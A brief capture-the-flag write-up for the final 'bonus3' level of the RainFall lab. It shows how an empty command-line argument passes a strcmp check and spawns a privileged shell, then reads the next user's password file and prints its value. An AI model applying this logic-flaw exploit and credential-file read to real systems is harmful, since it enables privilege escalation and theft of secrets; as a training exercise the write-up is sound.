the programme will execute the command `execl("/bin/sh", "sh", 0);` if the condition are completed 
we need to compare ptr and argv[1] 
`  if ( !strcmp(ptr, argv[1]) )`
`ptr[atoi(argv[1])] = 0`
if we can set argv[1] at 0 and \0 we can complete our conditions

```
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

# we just finished rainfall \0/
```
bonus3@RainFall:~$ su end
Password: 
end@RainFall:~$ ls
end
end@RainFall:~$ cat end
Congratulations graduate!
```